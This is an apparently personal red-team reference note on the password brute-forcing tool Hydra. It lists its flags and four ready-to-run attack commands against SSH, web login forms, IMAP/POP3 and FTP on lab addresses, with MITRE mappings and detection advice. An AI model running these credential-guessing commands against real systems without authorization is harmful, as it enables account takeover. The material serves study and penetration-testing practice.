---
type: tool
room: red
tool_name: "hydra"
version: "v9.x"
platform: [Linux, macOS]
phase: [Credential Access]
tags: [red/tool, red/credential-access, brute-force, passwords]
date_added: 2026-10-30
last_reviewed: 2026-10-30
---

# hydra

> [!quote]
> *"It is a capital mistake to theorize before one has data."*
> — *A Scandal in Bohemia*

**Room:** Red — Instruments | **Phase(s):** `Credential Access` | **Platform:** `Linux, macOS`

---

## The Instrument *(What It Is)*

THC Hydra is a fast, multi-threaded network logon cracker supporting over 50 protocols (SSH, FTP, HTTP, IMAP, POP3, SMB, RDP, MySQL, etc.). It is the standard offensive instrument for dictionary attacks, password spraying, and online brute-force testing against exposed authentication daemons.

- **Author / Origin:** Marc "van Hauser" Heuse / The Hacker's Choice (THC)
- **License:** GNU AGPL v3.0
- **Install:** `sudo apt install hydra`

---

## The Method *(Core Usage)*

### Basic Syntax
```bash
hydra [options] -l <username>|-L <userlist> -p <password>|-P <wordlist> <target> <service>
```

### Key Flags

| Flag | Meaning |
|------|---------|
| `-l <user>` | Single username to test |
| `-L <file>` | Path to wordlist containing usernames |
| `-p <pass>` | Single password to test |
| `-P <file>` | Path to wordlist containing passwords (e.g. `rockyou.txt`) |
| `-s <port>` | Connect to a non-standard service port |
| `-t <threads>` | Number of parallel worker threads (default: 16) |
| `-f` | Finish/exit immediately upon finding the first valid credential |
| `-v` / `-V` / `-vV` | Verbose mode / show login+password attempt for each request |
| `-w <sec>` | Wait time in seconds between requests (rate limit / lockout evasion) |
| `-o <file>` | Write found credentials to output file |
| `-M <file>` | List of target hosts to test in parallel |

---

## The Cases *(Common Use-Patterns)*

### Case 1 — SSH Service Dictionary Attack
```bash
# Brute-force SSH with a single user and RockYou wordlist, stopping on success
hydra -l frank -P /usr/share/wordlists/rockyou.txt -t 4 -f -vV 10.10.10.50 ssh
```

### Case 2 — Web Form Authentication (HTTP-POST-Form)
```bash
# Brute-force a web login page detecting failure string
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.50 http-post-form \
  "/login.php:username=^USER^&password=^PASS^:F=Invalid credentials"
```

### Case 3 — Email Services (IMAP / POP3)
```bash
# Attack IMAP mail service for specific mailbox
hydra -l lazie -P /usr/share/wordlists/rockyou.txt 10.10.10.50 imap

# Attack POP3 with username and password lists
hydra -L users.txt -P passwords.txt -t 8 10.10.10.50 pop3
```

### Case 4 — FTP & Non-Standard Ports
```bash
# Attack FTP on alternate port 2121
hydra -l mark -P /usr/share/wordlists/rockyou.txt -s 2121 10.10.10.50 ftp
```

---

## MITRE ATT&CK Mapping

| Technique ID | Technique Name |
|-------------|----------------|
| `T1110.001` | Brute Force: Password Guessing |
| `T1110.003` | Brute Force: Password Spraying |
| `T1110.004` | Brute Force: Credential Stuffing |

---

## Gotchas & Caveats

> [!warning] Common Mistakes
> - **Thread Overload:** Setting `-t` too high on SSH (e.g., `-t 32`) frequently causes `sshd` to drop connections or refuse forks, leading to false negatives. Use `-t 4` for SSH.
> - **Account Lockout:** Blasting generic wordlists without knowing the target's lockout policy will lock user accounts and alert defenders. Always identify lockout thresholds first.
> - **HTTP Form Parsing:** In `http-post-form`, the failure condition `F=` must match the exact case and text returned in the HTML response.

---

## OPSEC Notes

- **Logs:** Generates massive failed authentication logs (`/var/log/auth.log`, Event ID 4625 on Windows, web server 401/403 logs).
- **Network Signatures:** High frequency of SYN/ACK handshakes to service ports triggers IDS/IPS rules (e.g. Snort rule `ET SCAN Potential SSH Brute Force`).
- **Defensive Mitigation:** Automated ban engines (`fail2ban`), rate limiters, multi-factor authentication (MFA), and CAPTCHA.

---

## Related Notes

- [[Red/Monographs/TA0006 - Credential Access|TA0006 — Credential Access]]
- [[Red/Instruments/hashcat|hashcat]]
- [[Red/Instruments/netexec|netexec]]
- [[Casebook/Labs/TryHackMe/THM - Protocols and Servers 2|THM — Protocols and Servers 2]]

↩ [[Red/Instruments/readme|Red: Instruments]] · [[Red/Red|Red]] · [[Mind Palace]]
